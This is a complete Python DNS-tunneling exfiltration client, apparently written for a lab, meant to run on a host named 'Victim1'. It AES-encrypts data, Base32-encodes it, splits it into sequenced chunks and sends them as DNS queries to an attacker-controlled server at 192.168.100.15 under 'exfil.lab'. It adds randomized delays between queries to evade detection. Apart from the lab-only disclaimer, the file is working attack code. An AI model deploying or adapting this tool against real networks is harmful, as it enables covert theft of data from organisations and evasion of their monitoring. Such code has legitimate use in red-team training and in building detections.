#!/usr/bin/env python3
"""
Evasive DNS Tunneling Client (AES + Base32 + Sequencing + Timing)

Deploy this on Victim1 (192.168.100.101).
Encrypts data with AES-GCM, encodes using Base32, splits into chunks
with sequence numbers, and sends DNS A record queries to a controlled
DNS server (Kali @ 192.168.100.15) for the domain 'exfil.lab'.

Intended solely for controlled lab experiments. Requires a corresponding
DNS server setup on Kali to log/process these queries.
"""
import dns.resolver
import base64
import time
import random
import math
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# --- Configuration ---
TARGET_DOMAIN = "exfil.lab"      # Domain controlled by your DNS server
DNS_SERVER_IP = "192.168.100.15" # IP of your controlled DNS server (Kali)
CHUNK_LABEL_SIZE = 45            # Max size for each data part within a label (DNS labels <= 63)
MIN_DELAY = 0.5                  # Min delay between queries (seconds)
MAX_DELAY = 2.0                  # Max delay between queries (seconds)

# WARNING: Hardcoded key is insecure! For demo purposes only.
# Must be 16, 24, or 32 bytes long. MATCHES SERVER-SIDE DECRYPTION KEY.
AES_KEY = b'MySecureKeyForDNSTunneling12345' # 32 bytes for AES-256
# ---------------------

# AES-GCM constants
NONCE_AES_SIZE = 16 # Bytes
TAG_AES_SIZE = 16   # Bytes

def encrypt_data_aes(key, data):
    """Encrypts data using AES-GCM."""
    try:
        cipher = AES.new(key, AES.MODE_GCM)
        nonce = cipher.nonce # Nonce must be sent or known by receiver
        ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
        # Prepend Nonce and Tag to the ciphertext for sending
        # Receiver will need to parse Nonce (16b), Tag (16b), then Ciphertext
        print(f"[DEBUG] AES Nonce: {nonce.hex()}")
        print(f"[DEBUG] AES Tag: {tag.hex()}")
        return nonce + tag + ciphertext
    except Exception as e:
        print(f"[!] AES Encryption failed: {e}")
        return None

def exfiltrate_via_dns(data_to_exfil):
    """Encrypts, encodes, chunks, and sends data via DNS queries."""

    # 1. Encrypt the data
    print("[*] Encrypting data with AES-GCM...")
    encrypted_data = encrypt_data_aes(AES_KEY, data_to_exfil)
    if not encrypted_data:
        return
    print(f"[+] Data encrypted ({len(encrypted_data)} bytes including nonce/tag).")

    # 2. Encode encrypted data using Base32 (DNS-safe characters)
    # Base32 output is uppercase, no padding needed for DNS usually
    encoded_data_b32 = base64.b32encode(encrypted_data).decode('utf-8').rstrip('=')
    print(f"[+] Encrypted data encoded in Base32 ({len(encoded_data_b32)} chars).")
    # print(f"[DEBUG] Base32 Encoded: {encoded_data_b32}") # Can be very long

    # 3. Split encoded data into chunks suitable for DNS labels
    chunks = [encoded_data_b32[i:i+CHUNK_LABEL_SIZE] for i in range(0, len(encoded_data_b32), CHUNK_LABEL_SIZE)]
    total_chunks = len(chunks)
    print(f"[*] Split encoded data into {total_chunks} chunks (max label size: {CHUNK_LABEL_SIZE}).")

    # 4. Configure DNS Resolver to use controlled server
    # Note: In real-world evasion, using system resolvers is often preferred,
    # but requires the target domain to be properly delegated.
    # For a closed lab, targeting the server directly is simpler.
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [DNS_SERVER_IP]
    resolver.timeout = 2 # Lower timeout as we don't expect real answers
    resolver.lifetime = 2
    print(f"[*] Configured DNS resolver to use: {DNS_SERVER_IP}")

    # 5. Send chunks via DNS queries with sequencing and delays
    print("[*] Starting DNS exfiltration...")
    for idx, chunk in enumerate(chunks):
        seq_num = idx + 1 # 1-based sequence number

        # Construct the domain: <seq_num>.<chunk>.<target_domain>
        # Ensure seq_num doesn't make the first label too long if chunk is max size
        query_domain = f"{seq_num}.{chunk}.{TARGET_DOMAIN}"

        # Check overall domain length (max 253 bytes) - unlikely to hit here with reasonable chunks
        if len(query_domain) > 253:
             print(f"[WARN] Constructed domain name too long, skipping chunk {seq_num}: {query_domain[:60]}...")
             continue

        # Introduce random delay
        delay = random.uniform(MIN_DELAY, MAX_DELAY)
        print(f"[*] Chunk {seq_num}/{total_chunks}: Waiting {delay:.2f}s...")
        time.sleep(delay)

        print(f"[*] Sending DNS query for: {query_domain[:80]}...") # Print truncated query
        try:
            # Send A record query. We don't care about the answer, only that the query is sent/logged.
            # `raise_on_no_answer=False` prevents exceptions if the name doesn't exist.
            resolver.resolve(query_domain, 'A', raise_on_no_answer=False)
            # print(f"[DEBUG] Query sent for {query_domain}") # Optional success confirmation
        except dns.resolver.NoNameservers as e:
             print(f"[!] Error: Could not reach DNS server {DNS_SERVER_IP}. Aborting. ({e})")
             break # Stop if DNS server is unreachable
        except dns.exception.Timeout:
             print(f"[WARN] DNS query timed out for chunk {seq_num}. Server might be slow or offline.")
             # Continue to next chunk or implement retry logic if needed
        except Exception as e:
            # Log other unexpected errors but attempt to continue
            print(f"[WARN] Unexpected error for chunk {seq_num}: {e}")

    print("[*] DNS exfiltration process complete.")

# --- Main Execution ---
if __name__ == '__main__':
    # Data to exfiltrate (replace with actual data if needed)
    secret_data = "This is highly sensitive data being exfiltrated from Victim1 using enhanced DNS tunneling."
    print(f"[*] Preparing to exfiltrate data: '{secret_data[:50]}...'")

    exfiltrate_via_dns(secret_data)